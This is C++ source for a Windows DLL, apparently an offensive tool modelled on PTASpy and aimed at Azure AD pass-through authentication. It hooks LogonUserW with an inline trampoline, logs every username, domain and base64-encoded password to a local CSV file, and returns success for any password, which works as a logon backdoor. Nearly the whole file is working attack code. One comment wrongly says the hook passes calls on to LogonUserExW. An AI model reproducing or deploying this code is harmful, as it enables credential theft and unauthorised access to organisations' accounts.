#include <windows.h>
#include <stdio.h>
#include <fstream>
#include <string>
#include <sstream>
#include <ctime>
#include <algorithm>

#pragma comment(lib, "crypt32.lib")

// Based on Adam Chester's work: https://blog.xpnsec.com/azuread-connect-for-redteam/

// Simple ASM trampoline
// mov r11, 0x4142434445464748
// jmp r11
unsigned char trampoline[] = { 0x49, 0xbb, 0x48, 0x47, 0x46, 0x45, 0x44, 0x43, 0x42, 0x41, 0x41, 0xff, 0xe3 };

BOOL LogonUserWHook(LPCWSTR username, LPCWSTR domain, LPCWSTR password, DWORD logonType, DWORD logonProvider, PHANDLE hToken);
std::string LtoString(LPCWSTR wString);
std::wstring LtoWString(LPCWSTR wString);
void sendMessage(const wchar_t* message);

HANDLE pipeHandle = INVALID_HANDLE_VALUE;

void Start(void) {
	DWORD oldProtect;

	void* LogonUserWAddr = GetProcAddress(LoadLibraryA("advapi32.dll"), "LogonUserW");
	if (LogonUserWAddr == NULL) {
		// Should never happen, but just incase
		return;
	}

	// Update page protection so we can inject our trampoline
	VirtualProtect(LogonUserWAddr, 0x1000, PAGE_EXECUTE_READWRITE, &oldProtect);

	// Add our JMP addr for our hook
	*(void**)(trampoline + 2) = &LogonUserWHook;

	// Copy over our trampoline
	memcpy(LogonUserWAddr, trampoline, sizeof(trampoline));

	// Restore previous page protection so Dom doesn't shout
	VirtualProtect(LogonUserWAddr, 0x1000, oldProtect, &oldProtect);

}

// The hook we trampoline into from the beginning of LogonUserW
// Will invoke LogonUserExW when complete, or return a status ourselves
BOOL LogonUserWHook(LPCWSTR username, LPCWSTR domain, LPCWSTR password, DWORD logonType, DWORD logonProvider, PHANDLE hToken) {

	std::wstringstream pipeBuffer;

	// Base 64 encode the password

	std::wstring Wpassword = LtoWString(password);

	DWORD nDestinationSize;
	if (CryptBinaryToString(reinterpret_cast<const BYTE*> (password), Wpassword.length()*2, CRYPT_STRING_BASE64, nullptr, &nDestinationSize))
	{
		LPTSTR pszDestination = static_cast<LPTSTR> (HeapAlloc(GetProcessHeap(), HEAP_NO_SERIALIZE, nDestinationSize * sizeof(TCHAR)));
		if (pszDestination)
		{
			if (CryptBinaryToString(reinterpret_cast<const BYTE*> (password), Wpassword.length()*2, CRYPT_STRING_BASE64, pszDestination, &nDestinationSize))
			{
				// All good, ready to send the message
				// But first, we need to remove CRLFs because CryptBinaryToString adds them always :(
				std::wstring Wpassword = LtoWString(pszDestination);

				// https://stackoverflow.com/questions/1488775/c-remove-new-line-from-multiline-string
				int n = 0;
				for (int i = 0;i < Wpassword.length();i++) {
					if (Wpassword[i] == '\n' || Wpassword[i] == '\r') {
						n++;//we increase the number of newlines we have found so far
					}
					else {
						Wpassword[i - n] = Wpassword[i];
					}
				}
				Wpassword.resize(Wpassword.length() - n);//to delete only once the last n elements witch are now newlines

				pipeBuffer << LtoWString(username) << "," << LtoWString(domain) << "," << std::time(0) << "," << Wpassword << std::endl;
				const wchar_t* message = pipeBuffer.str().c_str();

				sendMessage(message);
			}
			HeapFree(GetProcessHeap(), HEAP_NO_SERIALIZE, pszDestination);
		}
	}

	// Always return true to accept any password
	return true;

}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		Start();
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

std::wstring LtoWString(LPCWSTR wString)
{
	std::wstring tempWstring(wString);
	return tempWstring;
}

std::string LtoString(LPCWSTR wString)
{
	std::wstring tempWstring(wString);
	std::string tempstring(tempWstring.begin(), tempWstring.end());
	return tempstring;
}

void sendMessage(const wchar_t* message)
{
	std::ofstream outfile;
	outfile.open("C:\\PTASpy\\PTASpy.csv", std::ios_base::app);
	outfile << LtoString(message);
	outfile.close();
}